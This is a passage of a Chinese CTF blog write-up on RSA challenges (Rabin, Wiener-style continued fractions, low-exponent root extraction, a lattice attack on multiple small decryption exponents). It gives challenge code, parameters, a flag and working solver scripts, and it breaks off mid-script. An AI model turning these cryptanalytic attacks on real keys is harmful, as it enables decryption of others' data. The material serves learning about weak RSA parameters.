class="string">&#x27;恭喜！&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{D0_y0u_R3aLly_Kn0w_Ra8IN_alg0RI7HM?}’</p></blockquote><p>惭愧，e=2确实应该优先考虑rabin的🤔</p><h2 id="安徽省赛·Cross-Fire"><a href="#安徽省赛·Cross-Fire" class="headerlink" title="安徽省赛·Cross_Fire"></a>安徽省赛·Cross_Fire</h2><ul><li>题目与题解来自<a href="https://www.cnblogs.com/Sentry-InkCity/p/15484426.html">Sentry_InkCity 师傅</a></li></ul><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n,n2s</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(plaintext)&gt;<span class="number">128</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m=s2n(plaintext)</span><br><span class="line">p=getPrime(<span class="number">500</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line">hint1=p*q*r</span><br><span class="line">hint2=next_prime(p)*next_prime(q)*next_prime(r)</span><br><span class="line">n=next_prime(<span class="number">123</span>*p+<span class="number">456</span>)*next_prime(<span class="number">233</span>*q+<span class="number">233</span>)*next_prime(<span class="number">666</span>*r+<span class="number">666</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint1=&quot;</span>,hint1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint2=&quot;</span>,hint2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint1= 66597706438052968602907975635364474124624609040691375744383573309100970537667852695911406578339583406993354597653539587007399024156000284162006381513057917653763467490913961403796256103799712489840324677890516295291754752667080587689619591977796148937147026181153407872286012339573004262967216008992456987530280248046317633785368985937352761743401538167742790063446090181640923337990535120783172231525752911772643973809736013911022053243030289179238536988831429875919863032051710061637295482848897179403927441453047333367742504111531477527219109139209305898423562329209375385774722090035022238350104808001927840789351874748994613148197348389169808276135120368108948370654768586592518609889834086412071206692748953099899446867217942417300125520378227882738726940028929</span></span><br><span class="line"><span class="string">hint2= 66597706438052968602907975635364474124624609040691375744383573309100970537667852695911406578339583406993354597653539587007399024156000284162006381519250037838090700817357286993539595751890863552857025186501118668940000586180857161834771657275281213521087010590085823066429019242511957345355841205805490396285530197202608369351669705515187871274740384884445010749950651326231261308185878145343225072286358030343013074077614396504748731540529394175170653286604110001303387433196918194353309815286558369700754725062771941489664316582212235229725924291159030267475029526286194732206037792356401019048507530494720324382797923052122766854647054667572207470351698834488250064200327557388850421313632751275068766021705342276955127790709872384961830995521889674866200643581197</span></span><br><span class="line"><span class="string">e= 65537</span></span><br><span class="line"><span class="string">n= 1271143363426234578109032622706784368982452702551117975547220359092039459949589311614475250751670324493441017909825758822014002389769016887770094631267325830636300148439767061540517538240094507617502786636783685853116121519909167755693185341466272016646232460012649033718198945340871434729792726475237884312244749128647675044166254114409979208613136490968091271215324179363007030770031883104198634577994666369930225951242263540549447415742095183638116238138212512007206154136596565735565134655180583298422538746349678634986942613303728294063886412713958813109459261894779056221585991240656450995515329105180293668452080201635903397760758605883754955173299769359099672851020901544947845931039456152020654355740641530636597180573996251235682717406311406638139251493213898068501</span></span><br><span class="line"><span class="string">c= 1216485134271178449567116916754420573073303455397620989326464150108908572336526711707238151485187836142308657852844139181641136164876989706372528330194558764108985905734554870749686706876362171680539349216110583849976294434959121174943229853669205013854742739444539161076289486434305028669545715151531610132849739705231210851708893517910447015945450432744842995436173783966889593804335503774508824344205419870078981016701436069437155486571657204182510954434683255699530711440688659074538879785922444601494725802905576491078834520957416860895991743319707987718280613091465577249499325647665822748760483739502978877174961037108839466736686647462799492964587695553596641935803152814769663732674949417986994233658218593205643014847168221928973615157533648368075119704854913178864</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>太🥬了，没有任何思路</p><p>看了师傅题解后，发现搁置的知识点突然攻击我</p><p><strong>以连分素数为基础的维纳攻击</strong></p><ul><li><p>连分素数分解出p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N1= <span class="number">66597706438052968602907975635364474124624609040691375744383573309100970537667852695911406578339583406993354597653539587007399024156000284162006381513057917653763467490913961403796256103799712489840324677890516295291754752667080587689619591977796148937147026181153407872286012339573004262967216008992456987530280248046317633785368985937352761743401538167742790063446090181640923337990535120783172231525752911772643973809736013911022053243030289179238536988831429875919863032051710061637295482848897179403927441453047333367742504111531477527219109139209305898423562329209375385774722090035022238350104808001927840789351874748994613148197348389169808276135120368108948370654768586592518609889834086412071206692748953099899446867217942417300125520378227882738726940028929</span></span><br><span class="line">N2= <span class="number">1271143363426234578109032622706784368982452702551117975547220359092039459949589311614475250751670324493441017909825758822014002389769016887770094631267325830636300148439767061540517538240094507617502786636783685853116121519909167755693185341466272016646232460012649033718198945340871434729792726475237884312244749128647675044166254114409979208613136490968091271215324179363007030770031883104198634577994666369930225951242263540549447415742095183638116238138212512007206154136596565735565134655180583298422538746349678634986942613303728294063886412713958813109459261894779056221585991240656450995515329105180293668452080201635903397760758605883754955173299769359099672851020901544947845931039456152020654355740641530636597180573996251235682717406311406638139251493213898068501</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuedFra</span>(<span class="params">x, y</span>):</span> <span class="comment">#不断生成连分数的项</span></span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF += [x // y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Simplify</span>(<span class="params">ctnf</span>):</span> <span class="comment">#化简</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ctnf[::-<span class="number">1</span>]: <span class="comment">#注意这里是倒叙遍历</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator) <span class="comment">#把连分数分成分子和算出来的分母</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getit</span>(<span class="params">c</span>):</span></span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        cf.append(Simplify(c[:i])) <span class="comment">#各个阶段的连分数的分子和分母</span></span><br><span class="line">    <span class="keyword">return</span> cf <span class="comment">#得到一串连分数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    <span class="keyword">for</span> (Q2,Q1) <span class="keyword">in</span> getit(cf):<span class="comment">#遍历得到的连分数，令分子分母分别是Q2，Q1</span></span><br><span class="line">        <span class="keyword">if</span> Q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> N1%Q1==<span class="number">0</span> <span class="keyword">and</span> Q1!=<span class="number">1</span>:<span class="comment">#满足这个条件就找到了</span></span><br><span class="line">            <span class="keyword">return</span> Q1</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not find!&#x27;</span>)</span><br><span class="line">Q1=wienerAttack(N1,N2)</span><br><span class="line"><span class="built_in">print</span>(Q1)</span><br></pre></td></tr></table></figure></li><li><p>相邻素数<strong>爆破</strong>求解q、r</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q = <span class="built_in">Symbol</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">r = <span class="built_in">Symbol</span>(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">qr = <span class="number">24000465830725710567609789107532324217407562259754653134149621603287774548503009977306790950765445986759457303910590756566445763189685864660421027894624160496364130162710203056019260859349197460287247433237333855820008311336990774902044072459096643794460636549390819914523204123744097150936438700304426418945328341075502713761684579112067780970129462407486292351679441221444463557410246953331098106055732155261630435421138374418050504535474800628754964367103623724936338041432343848497819682915988508211563927368529558866912220856126132024687748646133065560766894641603193094511181987021442275364527221213343560893411</span></span><br><span class="line">qr1 =  <span class="number">24000465830725710567609789107532324217407562259754653134149621603287774548503009977306790950765445986759457303910590756566445763189685864660421027894624160496364130162710203056019260859349197460287247433237333855820008311336990774902044072459096643794460636549390819914523204123744097150936438700304426419195181206357035254463948831711777035126077563377919684721062749439252724456974588213705559491260601777470792467850627398598289093915869715222818079606170004475810187367332322557611964471968738992807153326972570559359950761752890888829934863609591544119615229826879764045397320279541476417371138268264031865992001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">if</span> i %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5000</span>):</span><br><span class="line">        <span class="keyword">if</span> j %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> solve([q * r -qr,(q + i) * (r + j) - qr1],[q,r]) != []:</span><br><span class="line">            <span class="built_in">print</span>(solve([q * r -qr,(q + i) * (r + j) - qr1],[q,r]))</span><br><span class="line">        <span class="keyword">if</span> j % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>,i,<span class="string">&quot;   j=&quot;</span>,j)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><ul><li>连分素数（维纳攻击）的适用条件与具体原理</li><li>相邻素数爆破可太久了，有没有更好的解决方式？</li></ul><h2 id="BUU·-INSHack2017-rsa16m"><a href="#BUU·-INSHack2017-rsa16m" class="headerlink" title="BUU·[INSHack2017]rsa16m"></a>BUU·<a href="https://buuoj.cn/challenges#[INSHack2017]rsa16m">[INSHack2017]rsa16m</a></h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><ul><li><p>给了组巨大的n、c</p></li><li><p>e=65537</p></li></ul><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>由$m^e \mod n= c$且m较小可知：</p><p>$m^e &lt; n$,所以：$c = m^e$,即：$m = c^{1/e}$</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="title">with</span> open(&#x27;rsa_16m.txt&#x27;) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="class"><span class="keyword">data</span> = f.readlines()</span></span><br><span class="line">    n = int(<span class="class"><span class="keyword">data</span>[0].split(&#x27;= &#x27;)[-1], 16)</span></span><br><span class="line">    c = int(<span class="class"><span class="keyword">data</span>[1].split(&#x27;= &#x27;)[-1], 16)</span></span><br><span class="line">    e = int(<span class="class"><span class="keyword">data</span>[2].split(&#x27;= &#x27;)[-1], 16)</span></span><br><span class="line">    # m^e = c</span><br><span class="line">    m = int(gmpy2.iroot(c, e)[<span class="number">0</span>])</span><br><span class="line">    print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>17年出的题，当时应该挺新颖有趣的哈哈。</p><p>而解题思路在低e攻击中有所体现</p><h2 id="Common"><a href="#Common" class="headerlink" title="Common"></a>Common</h2><h3 id="题目-大致"><a href="#题目-大致" class="headerlink" title="题目(大致)"></a>题目(大致)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m1 = flag[<span class="number">21</span>:]</span><br><span class="line">m2 = flag[:<span class="number">21</span>]</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"><span class="comment"># e1 =  28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line"><span class="comment"># e2 =  131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line"><span class="comment"># n =  159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line"><span class="comment"># c1 =  125774545911886560112703402972153322080506025378797523936708278181480201146872577291738201370911792392950418121767343486509724963000477466590009600240375221563806039364611362947152096656513910712238094956240996452246301471555709823003175801134035094856941903678067489942047840663479442285170087613352040341832</span></span><br><span class="line"><span class="comment"># c2 =  125874844114757588984441500491946737723620819049276461078841545869549114013042058416210220287667061892072831243333341942699313440553285306436999725802970995457080384300690875762412008576026273931144721166609563493297003298586115510199518494430188305644317422640652955882264990001338974742192006748451975507803</span></span><br></pre></td></tr></table></figure><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>看到common，脑子里只有共模攻击，可悲</p><p>仔细看会发现，有两个m，<strong>不满足共模攻击</strong>（n, m相同）</p><p>去la佬RSA总结里找，找对了代码，居然只会照搬，事后看wp觉得自己连个合格的脚本小子都不是😢</p><p>先贴一下题解</p><p><strong>多组低解密指数攻击</strong></p><ul><li>求phi</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">N =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">c1 =  <span class="number">125774545911886560112703402972153322080506025378797523936708278181480201146872577291738201370911792392950418121767343486509724963000477466590009600240375221563806039364611362947152096656513910712238094956240996452246301471555709823003175801134035094856941903678067489942047840663479442285170087613352040341832</span></span><br><span class="line">c2 =  <span class="number">125874844114757588984441500491946737723620819049276461078841545869549114013042058416210220287667061892072831243333341942699313440553285306436999725802970995457080384300690875762412008576026273931144721166609563493297003298586115510199518494430188305644317422640652955882264990001338974742192006748451975507803</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) ) </span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, </span><br><span class="line">               [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="built_in">print</span>(phi)</span><br></pre></td></tr></table></figure><ul><li>求m1、m2</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">n =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">c1 =  <span class="number">125774545911886560112703402972153322080506025378797523936708278181480201146872577291738201370911792392950418121767343486509724963000477466590009600240375221563806039364611362947152096656513910712238094956240996452246301471555709823003175801134035094856941903678067489942047840663479442285170087613352040341832</span></span><br><span class="line">c2 =  <span class="number">125874844114757588984441500491946737723620819049276461078841545869549114013042058416210220287667061892072831243333341942699313440553285306436999725802970995457080384300690875762412008576026273931144721166609563493297003298586115510199518494430188305644317422640652955882264990001338974742192006748451975507803</span></span><br><span class="line">phi = <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781092330556185082570865052488981154655643850588559740031994465378408628749828052127213663711396922494795088638471519778995496857305118321851028470398469453660</span></span><br><span class="line">d1 = <span class="built_in">int</span>(gmpy2.invert(e1, phi))</span><br><span class="line">d2 = <span class="built_in">int</span>(gmpy2.invert(e2, phi))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c1, d1, n))).decode() + libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c2, d2, n))).decode())</span><br></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>因为$d = inv(e, phi)$，所以$ed = k•\phi + 1$，即：$d = \frac{k•\phi +1}{e}$</p><p>而e真的很大（正常就65537），想来d就大不了，即：<strong>低解密指数</strong></p><ul><li>低加密指数广播攻击需要给出e</li><li>多组低解密指数攻击不需要（也不能给出d）</li></ul><h2 id="CBCTF-·-check-in"><a href="#CBCTF-·-check-in" class="headerlink" title="CBCTF · check in"></a>CBCTF · check in</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">from sympy import isprime,nextprime</span><br><span class="line">from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line">from vanish import flag</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Getprime(g):</span><br><span class="line"> while True:</span><br><span class="line">     p=g*random.randint(<span class="number">1</span>,g)+<span class="number">1</span></span><br><span class="line">     if isprime(p):</span><br><span class="line">         return p</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">g=getprime(<span class="number">512</span>)</span><br><span class="line">p=Getprime(g)</span><br><span class="line">q=Getprime(g)</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">def lcm(a,b):</span><br><span class="line"> return (a*b)/gcd(a,b)</span><br><span class="line"></span><br><span class="line">print &#x27;lcm(p-1,q-1): %d&#x27;%(lcm(p-<span class="number">1</span>,q-<span class="number">1</span>))</span><br><span class="line">print &#x27;n: %d&#x27;%(p*q)</span><br><span class="line">print &#x27;c: %d&#x27;%(<span class="built_in">pow</span>(m,e,p*q))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">lcm(p-1,q-1): <span class="number">29222879530390</span><span class="number">78574260547774</span><span class="number">24534209029911</span><span class="number">75027283185502</span><span class="number">22457400590398</span><span class="number">62631690962406</span><span class="number">56898659768251</span><span class="number">13117015324335</span><span class="number">58965851162065</span><span class="number">46809026765977</span><span class="number">24039834384184</span><span class="number">44139320224862</span><span class="number">39027317290376</span><span class="number">87897026754970</span><span class="number">51302933523560</span><span class="number">70399197681533</span><span class="number">77464180992024</span><span class="number">57922773864183</span><span class="number">38948725614463</span><span class="number">60542260845098</span><span class="number">19464450297183</span><span class="number">69662946357705</span><span class="number">49928182336250</span><span class="number">83970076966359</span><span class="number">82211082237545</span><span class="number">03785162149872</span><span class="number">12352918853377</span><span class="number">20080893169582</span><span class="number">69978029470880</span><span class="number">43347867588786</span><span class="number">24750037193583</span><span class="number">88640472814681</span><span class="number">538094520154</span>0</span><br><span class="line">n: <span class="number">22285828148883</span><span class="number">22539771891137</span><span class="number">73397118125709</span><span class="number">79007008842697</span><span class="number">80928959802985</span><span class="number">61527528834111</span><span class="number">16203166857885</span><span class="number">11492461651695</span><span class="number">42869710055411</span><span class="number">30375554688818</span><span class="number">95905318207963</span><span class="number">27453758953234</span><span class="number">51661338200896</span><span class="number">94201148988443</span><span class="number">49651475107485</span><span class="number">79661360411573</span><span class="number">36680322417272</span><span class="number">18377740935159</span><span class="number">72689086256775</span><span class="number">12781049274972</span><span class="number">32576950095975</span><span class="number">52980046434070</span><span class="number">23188886359792</span><span class="number">41164818358288</span><span class="number">89792197856539</span><span class="number">27285023667015</span><span class="number">99092944199206</span><span class="number">13674483651230</span><span class="number">92899330885934</span><span class="number">80101341113217</span><span class="number">35509549389615</span><span class="number">20075931155848</span><span class="number">84399182472372</span><span class="number">71872976634200</span><span class="number">31211934554344</span><span class="number">56893317117917</span><span class="number">52377227169713</span><span class="number">90081142435747</span><span class="number">79627269811809</span><span class="number">73378035593163</span><span class="number">19210494963021</span><span class="number">25838661328536</span><span class="number">02396623549535</span><span class="number">52369582646607</span></span><br><span class="line">c: <span class="number">22011068530185</span><span class="number">81355094419701</span><span class="number">17199773103684</span><span class="number">37500819167035</span><span class="number">04266002782698</span><span class="number">73128831769054</span><span class="number">62423363458907</span><span class="number">02261049147276</span><span class="number">08404727129322</span><span class="number">73149691531380</span><span class="number">29180802403349</span><span class="number">98051905085769</span><span class="number">94727203334003</span><span class="number">48342466190619</span><span class="number">77824778467435</span><span class="number">92717365692750</span><span class="number">19018808569614</span><span class="number">56688081374561</span><span class="number">95855292921556</span><span class="number">39979431043005</span><span class="number">51190554834576</span><span class="number">76854723407632</span><span class="number">30813956617014</span><span class="number">12276847727223</span><span class="number">65184670640161</span><span class="number">33244646900977</span><span class="number">04195984879357</span><span class="number">98348487735480</span><span class="number">18337874928875</span><span class="number">04655072115457</span><span class="number">56525286418503</span><span class="number">15494384644468</span><span class="number">80605802181260</span><span class="number">37484412461927</span><span class="number">57443085386516</span><span class="number">15581433730768</span><span class="number">12759224735643</span><span class="number">25028703523754</span><span class="number">31907211720208</span><span class="number">32181999612501</span><span class="number">57611091952832</span><span class="number">03836639332227</span><span class="number">51948339270356</span><span class="number">39232266868638</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span 